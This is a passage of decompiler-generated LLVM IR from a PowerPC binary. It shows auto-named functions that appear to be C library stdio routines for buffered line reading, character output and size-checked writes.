  %v0_10006a4c = call i32 @function_10005548()
  store i32 -1, i32* @r28, align 4
  %v3_10006a54 = icmp eq i32 %v0_10006a4c, 0
  br i1 %v3_10006a54, label %dec_label_pc_10006a5c, label %dec_label_pc_10006a74

dec_label_pc_10006a5c:                            ; preds = %dec_label_pc_10006a4c
  %v0_10006a5c = load i32, i32* @r29, align 4
  %v1_10006a5c = inttoptr i32 %v0_10006a5c to i16*
  %v2_10006a5c = load i16, i16* %v1_10006a5c, align 2
  %v3_10006a5c = zext i16 %v2_10006a5c to i32
  store i32 0, i32* @r28, align 4
  %v1_10006a64 = add i32 %v0_10006a5c, 8
  %v2_10006a64 = inttoptr i32 %v1_10006a64 to i32*
  %v3_10006a64 = load i32, i32* %v2_10006a64, align 4
  store i32 %v3_10006a64, i32* %r9.global-to-local, align 4
  %v1_10006a68 = call i32 @__asm_rlwinm(i32 %v3_10006a5c, i32 0, i32 26, i32 24)
  %v2_10006a68 = trunc i32 %v1_10006a68 to i16
  %v3_10006a6c = load i32, i32* @r29, align 4
  %v4_10006a6c = inttoptr i32 %v3_10006a6c to i16*
  store i16 %v2_10006a68, i16* %v4_10006a6c, align 2
  %v0_10006a70 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006a70 = load i32, i32* @r29, align 4
  %v2_10006a70 = add i32 %v1_10006a70, 28
  %v3_10006a70 = inttoptr i32 %v2_10006a70 to i32*
  store i32 %v0_10006a70, i32* %v3_10006a70, align 4
  br label %dec_label_pc_10006a74

dec_label_pc_10006a74:                            ; preds = %dec_label_pc_10006a4c, %dec_label_pc_10006a3c, %dec_label_pc_10006a34, %dec_label_pc_10006a5c
  %v0_10006a78 = load i32, i32* @r28, align 4
  ret i32 %v0_10006a78

; uselistorder directives
  uselistorder i32 %v3_10006a28, { 1, 2, 0 }
  uselistorder i32 %v1_100069d8, { 1, 0 }
  uselistorder i32 %v2_1000691c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @function_100067bc, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_10010438.217 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10010494.196, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006a74, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006a28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006a0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100069cc, { 1, 0 }
  uselistorder label %dec_label_pc_10006994, { 1, 0 }
}

define i32 @function_10006a8c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006a8c:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10006b34, label %dec_label_pc_10006aac

dec_label_pc_10006aac:                            ; preds = %dec_label_pc_10006a8c
  store i32 %tmp, i32* @r31, align 4
  %v2_10006b143 = add i32 %arg2, -1
  store i32 %v2_10006b143, i32* @r29, align 4
  %v4_10006b1c9 = icmp eq i32 %arg2, 1
  br i1 %v4_10006b1c9, label %dec_label_pc_10006b20, label %dec_label_pc_10006ab4

dec_label_pc_10006ab4:                            ; preds = %dec_label_pc_10006aac, %dec_label_pc_10006b14.backedge
  %v2_10006ad0 = phi i32 [ %v2_10006ad012, %dec_label_pc_10006b14.backedge ], [ %tmp, %dec_label_pc_10006aac ]
  %v0_10006ab4 = phi i32 [ %v0_10006b18, %dec_label_pc_10006b14.backedge ], [ %arg3, %dec_label_pc_10006aac ]
  %v1_10006ab4 = add i32 %v0_10006ab4, 16
  %v2_10006ab4 = inttoptr i32 %v1_10006ab4 to i32*
  %v3_10006ab4 = load i32, i32* %v2_10006ab4, align 4
  %v1_10006ab8 = add i32 %v0_10006ab4, 24
  %v2_10006ab8 = inttoptr i32 %v1_10006ab8 to i32*
  %v3_10006ab8 = load i32, i32* %v2_10006ab8, align 4
  %v2_10006abc = add i32 %v3_10006ab4, 1
  store i32 %v2_10006abc, i32* %r11.global-to-local, align 4
  %v3_10006ac0 = icmp ult i32 %v3_10006ab4, %v3_10006ab8
  %v5_10006ac0 = icmp eq i32 %v3_10006ab4, %v3_10006ab8
  store i1 %v5_10006ac0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006ac0, label %dec_label_pc_10006ac8, label %dec_label_pc_10006ae4

dec_label_pc_10006ac8:                            ; preds = %dec_label_pc_10006ab4
  %v4_10006ab4 = inttoptr i32 %v3_10006ab4 to i8*
  %v3_10006ac8 = load i8, i8* %v4_10006ab4, align 1
  %v3_10006acc = icmp eq i8 %v3_10006ac8, 10
  store i1 %v3_10006acc, i1* %cr7_eq.global-to-local, align 1
  %v3_10006ad0 = inttoptr i32 %v2_10006ad0 to i8*
  store i8 %v3_10006ac8, i8* %v3_10006ad0, align 1
  %v0_10006ad4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006ad4 = load i32, i32* @r30, align 4
  %v2_10006ad4 = add i32 %v1_10006ad4, 16
  %v3_10006ad4 = inttoptr i32 %v2_10006ad4 to i32*
  store i32 %v0_10006ad4, i32* %v3_10006ad4, align 4
  %v0_10006ad8 = load i32, i32* @r31, align 4
  %v1_10006ad8 = add i32 %v0_10006ad8, 1
  store i32 %v1_10006ad8, i32* @r31, align 4
  %v0_10006adc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006adc, label %dec_label_pc_10006b20, label %dec_label_pc_10006b14.backedge

dec_label_pc_10006ae4:                            ; preds = %dec_label_pc_10006ab4
  %v1_10006b1810 = inttoptr i32 %v0_10006ab4 to i16*
  store i32 268462824, i32* @lr, align 4
  %v5_10006ae4 = call i32 @function_1000a2b4(i16* %v1_10006b1810, i32 %v3_10006ab4)
  %v6_10006ae4 = trunc i32 %v5_10006ae4 to i8
  %v4_10006ae8 = icmp eq i8 %v6_10006ae4, -1
  store i1 %v4_10006ae8, i1* %cr7_eq.global-to-local, align 1
  %v3_10006af0 = icmp eq i8 %v6_10006ae4, 10
  store i1 %v3_10006af0, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10006ae8, label %dec_label_pc_10006af8, label %dec_label_pc_10006b08

dec_label_pc_10006af8:                            ; preds = %dec_label_pc_10006ae4
  %v0_10006af8 = load i32, i32* @r30, align 4
  %v1_10006af8 = inttoptr i32 %v0_10006af8 to i16*
  %v2_10006af8 = load i16, i16* %v1_10006af8, align 2
  %v1_10006afc = and i16 %v2_10006af8, 8
  %v3_10006afc = icmp eq i16 %v1_10006afc, 0
  br i1 %v3_10006afc, label %dec_label_pc_10006af8.dec_label_pc_10006b20_crit_edge, label %dec_label_pc_10006b34

dec_label_pc_10006af8.dec_label_pc_10006b20_crit_edge: ; preds = %dec_label_pc_10006af8
  %v0_10006b20.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006b20

dec_label_pc_10006b08:                            ; preds = %dec_label_pc_10006ae4
  %v3_10006b08 = load i32, i32* @r31, align 4
  %v4_10006b08 = inttoptr i32 %v3_10006b08 to i8*
  store i8 %v6_10006ae4, i8* %v4_10006b08, align 1
  %v0_10006b0c = load i32, i32* @r31, align 4
  %v1_10006b0c = add i32 %v0_10006b0c, 1
  store i32 %v1_10006b0c, i32* @r31, align 4
  %v0_10006b10 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10006b10, label %dec_label_pc_10006b20, label %dec_label_pc_10006b14.backedge

dec_label_pc_10006b14.backedge:                   ; preds = %dec_label_pc_10006b08, %dec_label_pc_10006ac8
  %v2_10006ad012 = phi i32 [ %v1_10006b0c, %dec_label_pc_10006b08 ], [ %v1_10006ad8, %dec_label_pc_10006ac8 ]
  %v0_10006b14 = load i32, i32* @r29, align 4
  %v2_10006b14 = add i32 %v0_10006b14, -1
  store i32 %v2_10006b14, i32* @r29, align 4
  %v0_10006b18 = load i32, i32* @r30, align 4
  %v4_10006b1c = icmp eq i32 %v0_10006b14, 1
  br i1 %v4_10006b1c, label %dec_label_pc_10006b20, label %dec_label_pc_10006ab4

dec_label_pc_10006b20:                            ; preds = %dec_label_pc_10006b08, %dec_label_pc_10006b14.backedge, %dec_label_pc_10006ac8, %dec_label_pc_10006aac, %dec_label_pc_10006af8.dec_label_pc_10006b20_crit_edge
  %v2_10006b2c = phi i32 [ %v0_10006b20.pre, %dec_label_pc_10006af8.dec_label_pc_10006b20_crit_edge ], [ %tmp, %dec_label_pc_10006aac ], [ %v1_10006ad8, %dec_label_pc_10006ac8 ], [ %v2_10006ad012, %dec_label_pc_10006b14.backedge ], [ %v1_10006b0c, %dec_label_pc_10006b08 ]
  %v1_10006b20 = load i32, i32* @r28, align 4
  %v3_10006b20 = icmp ugt i32 %v2_10006b2c, %v1_10006b20
  %v4_10006b20 = icmp eq i32 %v2_10006b2c, %v1_10006b20
  store i1 %v4_10006b20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006b20, label %dec_label_pc_10006b28, label %dec_label_pc_10006b34

dec_label_pc_10006b28:                            ; preds = %dec_label_pc_10006b20
  %v3_10006b2c = inttoptr i32 %v2_10006b2c to i8*
  store i8 0, i8* %v3_10006b2c, align 1
  %v0_10006b3c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006b34:                            ; preds = %dec_label_pc_10006af8, %dec_label_pc_10006b20, %dec_label_pc_10006a8c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10006b38

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006b28, %dec_label_pc_10006b34
  %v0_10006b3c = phi i32 [ %v0_10006b3c.pre, %dec_label_pc_10006b28 ], [ 0, %dec_label_pc_10006b34 ]
  ret i32 %v0_10006b3c

; uselistorder directives
  uselistorder i32 %v2_10006b2c, { 0, 2, 1 }
  uselistorder i8 %v6_10006ae4, { 1, 0, 2 }
  uselistorder i32 %v3_10006ab8, { 1, 0 }
  uselistorder i32 %v3_10006ab4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10006ab4, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006b38, { 1, 0 }
  uselistorder label %dec_label_pc_10006b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006b20, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10006ab4, { 1, 0 }
}

define i32 @function_10006b50(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006b50:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp7 = sext i8 %arg1 to i32
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp7, i32* @r30, align 4
  %v2_10006b68 = add i32 %arg2, 16
  %v3_10006b68 = inttoptr i32 %v2_10006b68 to i32*
  %v4_10006b68 = load i32, i32* %v3_10006b68, align 4
  store i32 %v4_10006b68, i32* %r11.global-to-local, align 4
  %v2_10006b6c = add i32 %arg2, 28
  %v3_10006b6c = inttoptr i32 %v2_10006b6c to i32*
  %v4_10006b6c = load i32, i32* %v3_10006b6c, align 4
  %v2_10006b70 = icmp ult i32 %v4_10006b68, %v4_10006b6c
  br i1 %v2_10006b70, label %dec_label_pc_10006b78, label %dec_label_pc_10006b8c

dec_label_pc_10006b78:                            ; preds = %dec_label_pc_10006b50
  %v1_10006b781 = zext i8 %arg1 to i32
  %v1_10006b7c = add i32 %v4_10006b68, 1
  store i32 %v1_10006b7c, i32* %r9.global-to-local, align 4
  store i32 %v1_10006b781, i32* %r3.global-to-local, align 4
  %v3_10006b84 = inttoptr i32 %v4_10006b68 to i8*
  store i8 %arg1, i8* %v3_10006b84, align 1
  %v0_10006c30.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10006c30.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006c30

dec_label_pc_10006b8c:                            ; preds = %dec_label_pc_10006b50
  %v3_10006b8c = load i16, i16* %tmp, align 2
  %v4_10006b8c = zext i16 %v3_10006b8c to i32
  %v1_10006b90 = call i32 @__asm_rlwinm(i32 %v4_10006b8c, i32 0, i32 24, i32 25)
  %v3_10006b94 = icmp eq i32 %v1_10006b90, 192
  br i1 %v3_10006b94, label %dec_label_pc_10006bb0, label %dec_label_pc_10006b9c

dec_label_pc_10006b9c:                            ; preds = %dec_label_pc_10006b8c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 268463016, i32* @lr, align 4
  %v4_10006ba4 = call i32 @function_10009940(i16* nonnull %tmp, i32 128)
  store i32 %v4_10006ba4, i32* %r3.global-to-local, align 4
  %v3_10006ba8 = icmp eq i32 %v4_10006ba4, 0
  br i1 %v3_10006ba8, label %dec_label_pc_10006bb0, label %dec_label_pc_10006c5c

dec_label_pc_10006bb0:                            ; preds = %dec_label_pc_10006b9c, %dec_label_pc_10006b8c
  %v0_10006bb0 = load i32, i32* @r31, align 4
  %v1_10006bb0 = add i32 %v0_10006bb0, 4
  %v2_10006bb0 = inttoptr i32 %v1_10006bb0 to i32*
  %v3_10006bb0 = load i32, i32* %v2_10006bb0, align 4
  %v0_10006bb4 = load i32, i32* @r30, align 4
  %v1_10006bb4 = urem i32 %v0_10006bb4, 256
  store i32 %v1_10006bb4, i32* %r3.global-to-local, align 4
  %v3_10006bb8 = icmp eq i32 %v3_10006bb0, -2
  br i1 %v3_10006bb8, label %dec_label_pc_10006c60, label %dec_label_pc_10006bc0

dec_label_pc_10006bc0:                            ; preds = %dec_label_pc_10006bb0
  %v1_10006bc0 = add i32 %v0_10006bb0, 12
  %v2_10006bc0 = inttoptr i32 %v1_10006bc0 to i32*
  %v3_10006bc0 = load i32, i32* %v2_10006bc0, align 4
  store i32 %v3_10006bc0, i32* %r9.global-to-local, align 4
  %v1_10006bc4 = add i32 %v0_10006bb0, 8
  %v2_10006bc4 = inttoptr i32 %v1_10006bc4 to i32*
  %v3_10006bc4 = load i32, i32* %v2_10006bc4, align 4
  %v4_10006bc8 = icmp eq i32 %v3_10006bc0, %v3_10006bc4
  br i1 %v4_10006bc8, label %dec_label_pc_10006c38, label %dec_label_pc_10006bd0

dec_label_pc_10006bd0:                            ; preds = %dec_label_pc_10006bc0
  %v1_10006bd0 = add i32 %v0_10006bb0, 16
  %v2_10006bd0 = inttoptr i32 %v1_10006bd0 to i32*
  %v3_10006bd0 = load i32, i32* %v2_10006bd0, align 4
  %v4_10006bd4 = icmp eq i32 %v3_10006bc0, %v3_10006bd0
  br i1 %v4_10006bd4, label %dec_label_pc_10006bdc, label %dec_label_pc_10006bec

dec_label_pc_10006bdc:                            ; preds = %dec_label_pc_10006bd0
  store i32 %v0_10006bb0, i32* @r3, align 4
  store i32 268463076, i32* @lr, align 4
  %v0_10006be0 = call i32 @function_10005548()
  store i32 %v0_10006be0, i32* %r3.global-to-local, align 4
  %v3_10006be4 = icmp eq i32 %v0_10006be0, 0
  br i1 %v3_10006be4, label %dec_label_pc_10006bdc.dec_label_pc_10006bec_crit_edge, label %dec_label_pc_10006c5c

dec_label_pc_10006bdc.dec_label_pc_10006bec_crit_edge: ; preds = %dec_label_pc_10006bdc
  %v0_10006bec.pre = load i32, i32* @r31, align 4
  %v0_10006bf0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006bec

dec_label_pc_10006bec:                            ; preds = %dec_label_pc_10006bdc.dec_label_pc_10006bec_crit_edge, %dec_label_pc_10006bd0
  %v0_10006bf0 = phi i32 [ %v0_10006bf0.pre, %dec_label_pc_10006bdc.dec_label_pc_10006bec_crit_edge ], [ %v0_10006bb4, %dec_label_pc_10006bd0 ]
  %v0_10006bec = phi i32 [ %v0_10006bec.pre, %dec_label_pc_10006bdc.dec_label_pc_10006bec_crit_edge ], [ %v0_10006bb0, %dec_label_pc_10006bd0 ]
  %v1_10006bec = add i32 %v0_10006bec, 16
  %v2_10006bec = inttoptr i32 %v1_10006bec to i32*
  %v3_10006bec = load i32, i32* %v2_10006bec, align 4
  store i32 %v3_10006bec, i32* %r9.global-to-local, align 4
  %v1_10006bf0 = urem i32 %v0_10006bf0, 256
  store i32 %v1_10006bf0, i32* %r11.global-to-local, align 4
  %v1_10006bf4 = trunc i32 %v0_10006bf0 to i8
  %v3_10006bf4 = inttoptr i32 %v3_10006bec to i8*
  store i8 %v1_10006bf4, i8* %v3_10006bf4, align 1
  %v0_10006bf8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006bf8 = add i32 %v0_10006bf8, 1
  store i32 %v1_10006bf8, i32* %r9.global-to-local, align 4
  %v1_10006bfc = load i32, i32* @r31, align 4
  %v2_10006bfc = add i32 %v1_10006bfc, 16
  %v3_10006bfc = inttoptr i32 %v2_10006bfc to i32*
  store i32 %v1_10006bf8, i32* %v3_10006bfc, align 4
  %v0_10006c00 = load i32, i32* @r31, align 4
  %v1_10006c00 = inttoptr i32 %v0_10006c00 to i16*
  %v2_10006c00 = load i16, i16* %v1_10006c00, align 2
  %v3_10006c00 = zext i16 %v2_10006c00 to i32
  %v1_10006c04 = and i32 %v3_10006c00, 256
  store i32 %v1_10006c04, i32* %r9.global-to-local, align 4
  %v3_10006c04 = icmp eq i32 %v1_10006c04, 0
  br i1 %v3_10006c04, label %dec_label_pc_10006c54, label %dec_label_pc_10006c0c

dec_label_pc_10006c0c:                            ; preds = %dec_label_pc_10006bec
  %v0_10006c0c = load i32, i32* %r11.global-to-local, align 4
  %v3_10006c0c = icmp eq i32 %v0_10006c0c, 10
  br i1 %v3_10006c0c, label %dec_label_pc_10006c14, label %dec_label_pc_10006c54

dec_label_pc_10006c14:                            ; preds = %dec_label_pc_10006c0c
  store i32 %v0_10006c00, i32* @r3, align 4
  store i32 268463132, i32* @lr, align 4
  %v0_10006c18 = call i32 @function_10005548()
  store i32 %v0_10006c18, i32* %r3.global-to-local, align 4
  %v3_10006c1c = icmp eq i32 %v0_10006c18, 0
  br i1 %v3_10006c1c, label %dec_label_pc_10006c54, label %dec_label_pc_10006c24

dec_label_pc_10006c24:                            ; preds = %dec_label_pc_10006c14
  %v0_10006c24 = load i32, i32* @r31, align 4
  %v1_10006c24 = add i32 %v0_10006c24, 16
  %v2_10006c24 = inttoptr i32 %v1_10006c24 to i32*
  %v3_10006c24 = load i32, i32* %v2_10006c24, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10006c2c = add i32 %v3_10006c24, -1
  store i32 %v1_10006c2c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006c30

dec_label_pc_10006c30:                            ; preds = %dec_label_pc_10006b78, %dec_label_pc_10006c24
  %v1_10006c30 = phi i32 [ %v1_10006c30.pre, %dec_label_pc_10006b78 ], [ %v0_10006c24, %dec_label_pc_10006c24 ]
  %v0_10006c30 = phi i32 [ %v0_10006c30.pre, %dec_label_pc_10006b78 ], [ %v1_10006c2c, %dec_label_pc_10006c24 ]
  %v2_10006c30 = add i32 %v1_10006c30, 16
  %v3_10006c30 = inttoptr i32 %v2_10006c30 to i32*
  store i32 %v0_10006c30, i32* %v3_10006c30, align 4
  %v0_10006c70.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c60

dec_label_pc_10006c38:                            ; preds = %dec_label_pc_10006bc0
  %v1_10006c38 = inttoptr i32 %v0_10006bb0 to i16*
  store i32 %v0_10006bb0, i32* %r3.global-to-local, align 4
  %v2_10006c3c = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_10006c44 = trunc i32 %v0_10006bb4 to i8
  store i8 %v6_10006c44, i8* %stack_var_-24, align 1
  store i32 268463180, i32* @lr, align 4
  %v5_10006c48 = call i32 @function_100096f4(i16* %v1_10006c38, i32 %v2_10006c3c)
  store i32 %v5_10006c48, i32* %r3.global-to-local, align 4
  %v3_10006c4c = icmp eq i32 %v5_10006c48, 0
  br i1 %v3_10006c4c, label %dec_label_pc_10006c5c, label %dec_label_pc_10006c54

dec_label_pc_10006c54:                            ; preds = %dec_label_pc_10006c0c, %dec_label_pc_10006c38, %dec_label_pc_10006c14, %dec_label_pc_10006bec
  %v0_10006c54 = load i32, i32* @r30, align 4
  %v1_10006c54 = urem i32 %v0_10006c54, 256
  store i32 %v1_10006c54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c60

dec_label_pc_10006c5c:                            ; preds = %dec_label_pc_10006bdc, %dec_label_pc_10006b9c, %dec_label_pc_10006c38
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c60

dec_label_pc_10006c60:                            ; preds = %dec_label_pc_10006bb0, %dec_label_pc_10006c54, %dec_label_pc_10006c30, %dec_label_pc_10006c5c
  %v0_10006c70 = phi i32 [ %v1_10006bb4, %dec_label_pc_10006bb0 ], [ %v1_10006c54, %dec_label_pc_10006c54 ], [ %v0_10006c70.pre, %dec_label_pc_10006c30 ], [ -1, %dec_label_pc_10006c5c ]
  ret i32 %v0_10006c70

; uselistorder directives
  uselistorder i32 %v1_10006c54, { 1, 0 }
  uselistorder i32 %v0_10006bf0, { 1, 0 }
  uselistorder i32 %v1_10006bb4, { 1, 0 }
  uselistorder i32 %v0_10006bb4, { 1, 2, 0 }
  uselistorder i32 %v0_10006bb0, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_10006b68, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006c60, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10006c5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006c54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10006c30, { 1, 0 }
}

define i32 @function_10006c74(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006c74:
  store i32 %arg1, i32* @r3, align 4
  %v0_10006c8c = call i32 @function_10006ed4()
  store i32 %v0_10006c8c, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10006ca8.243 to i32), i32* @lr, align 4
  %v4_10006ca4 = inttoptr i32 %arg2 to i16*
  %v5_10006ca4 = call i32 @function_10006cd0(i32 %arg1, i32 1, i32 %v0_10006c8c, i16* %v4_10006ca4)
  %v1_10006cac = load i32, i32* @r27, align 4
  %v4_10006cac = icmp eq i32 %v5_10006ca4, %v1_10006cac
  br i1 %v4_10006cac, label %dec_label_pc_10006cb4, label %dec_label_pc_10006cb8

dec_label_pc_10006cb4:                            ; preds = %dec_label_pc_10006c74
  br label %dec_label_pc_10006cb8

dec_label_pc_10006cb8:                            ; preds = %dec_label_pc_10006c74, %dec_label_pc_10006cb4
  %v0_10006cb8 = phi i32 [ -1, %dec_label_pc_10006c74 ], [ %v5_10006ca4, %dec_label_pc_10006cb4 ]
  ret i32 %v0_10006cb8

; uselistorder directives
  uselistorder label %dec_label_pc_10006cb8, { 1, 0 }
}

define i32 @function_10006cd0(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_10006cd0:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v3_10006cdc = load i16, i16* %arg4, align 2
  %v4_10006cdc = zext i16 %v3_10006cdc to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10006cf0 = call i32 @__asm_rlwinm(i32 %v4_10006cdc, i32 0, i32 24, i32 25)
  store i32 128, i32* %r4.global-to-local, align 4
  %v3_10006cf8 = icmp eq i32 %v1_10006cf0, 192
  store i32 %arg3, i32* @r31, align 4
  br i1 %v3_10006cf8, label %dec_label_pc_10006d14, label %dec_label_pc_10006d08

dec_label_pc_10006d08:                            ; preds = %dec_label_pc_10006cd0
  store i32 268463372, i32* @lr, align 4
  %v4_10006d08 = call i32 @function_10009940(i16* nonnull %arg4, i32 128)
  %v3_10006d0c = icmp eq i32 %v4_10006d08, 0
  br i1 %v3_10006d0c, label %dec_label_pc_10006d08.dec_label_pc_10006d14_crit_edge, label %dec_label_pc_10006d6c

dec_label_pc_10006d08.dec_label_pc_10006d14_crit_edge: ; preds = %dec_label_pc_10006d08
  %v0_10006d18.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006d14

dec_label_pc_10006d14:                            ; preds = %dec_label_pc_10006d08.dec_label_pc_10006d14_crit_edge, %dec_label_pc_10006cd0
  %v0_10006d38 = phi i32 [ %v0_10006d18.pre, %dec_label_pc_10006d08.dec_label_pc_10006d14_crit_edge ], [ %arg3, %dec_label_pc_10006cd0 ]
  %v0_10006d14 = load i32, i32* @r29, align 4
  %v3_10006d14 = icmp eq i32 %v0_10006d14, 0
  %v3_10006d18 = icmp eq i32 %v0_10006d38, 0
  %brmerge = or i1 %v3_10006d18, %v3_10006d14
  br i1 %brmerge, label %dec_label_pc_10006d6c, label %dec_label_pc_10006d24

dec_label_pc_10006d24:                            ; preds = %dec_label_pc_10006d14
  %v2_10006d28 = mul i32 %v0_10006d14, %v0_10006d38
  store i32 %v2_10006d28, i32* %r4.global-to-local, align 4
  %v2_10006d2c = udiv i32 -1, %v0_10006d14
  %v0_10006d34 = load i32, i32* @r30, align 4
  %v3_10006d38 = icmp ugt i32 %v0_10006d38, %v2_10006d2c
  %v1_10006d4c = inttoptr i32 %v0_10006d34 to i16*
  br i1 %v3_10006d38, label %dec_label_pc_10006d4c, label %dec_label_pc_10006d40

dec_label_pc_10006d40:                            ; preds = %dec_label_pc_10006d24
  %v0_10006d30 = load i32, i32* @r28, align 4
  store i32 268463428, i32* @lr, align 4
  %v5_10006d40 = call i32 @function_100097d4(i32 %v0_10006d30, i32 %v2_10006d28, i16* %v1_10006d4c)
  %v1_10006d44 = load i32, i32* @r29, align 4
  %v2_10006d44 = udiv i32 %v5_10006d40, %v1_10006d44
  store i32 %v2_10006d44, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006d70

dec_label_pc_10006d4c:                            ; preds = %dec_label_pc_10006d24
  %v2_10006d4c = load i16, i16* %v1_10006d4c, align 2
  %v1_10006d50 = or i16 %v2_10006d4c, 8
  store i16 %v1_10006d50, i16* %v1_10006d4c, align 2
  %v0_10006d58 = call i32 @function_10004b48()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10006d64 = inttoptr i32 %v0_10006d58 to i32*
  store i32 22, i32* %v2_10006d64, align 4
  %v0_10006d74.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006d70

dec_label_pc_10006d6c:                            ; preds = %dec_label_pc_10006d14, %dec_label_pc_10006d08
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006d70

dec_label_pc_10006d70:                            ; preds = %dec_label_pc_10006d4c, %dec_label_pc_10006d40, %dec_label_pc_10006d6c
  %v0_10006d74 = phi i32 [ %v0_10006d74.pre, %dec_label_pc_10006d4c ], [ %v2_10006d44, %dec_label_pc_10006d40 ], [ 0, %dec_label_pc_10006d6c ]
  ret i32 %v0_10006d74

; uselistorder directives
  uselistorder i16* %v1_10006d4c, { 1, 2, 0 }
  uselistorder i32 %v0_10006d14, { 1, 0, 2 }
  uselistorder i32 %v0_10006d38, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_100097d4, { 6, 1, 2, 4, 5, 0, 3 }
  uselistorder i32 (i16*, i32)* @function_10009940, { 1, 0 }
  uselistorder label %dec_label_pc_10006d70, { 2, 0, 1 }
}

define i32 @function_10006d88() local_unnamed_addr {
dec_label_pc_10006d88:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10006d88 = load i32, i32* @r4, align 4
  %v1_10006d88 = add i32 %v0_10006d88, -4
  store i32 %v1_10006d88, i32* %r4.global-to-local, align 4
  %v0_10006d8c = load i32, i32* @r3, align 4
  %v1_10006d8c = add i32 %v0_10006d8c, -4
  store i32 %v1_10006d8c, i32* @r11, align 4
  %v0_10006d90 = load i32, i32* @r5, align 4
  %v1_10006d90 = call i32 @__asm_rlwinm.(i32 %v0_10006d90, i32 29, i32 3, i32 31)
  store i32 %v1_10006d90, i32* %r9.global-to-local, align 4
  %v4_10006d90 = icmp eq i32 %v1_10006d90, 0
  br i1 %v4_10006d90, label %dec_label_pc_10006db8, label %dec_label_pc_10006d98

dec_label_pc_10006d98:                            ; preds = %dec_label_pc_10006d88
  %v0_10006d98 = load i32, i32* @r11, align 4
  %v1_10006d98 = urem i32 %v0_10006d98, 4
  %v3_10006d98 = icmp eq i32 %v1_10006d98, 0
  br i1 %v3_10006d98, label %dec_label_pc_10006da0, label %dec_label_pc_10006df4

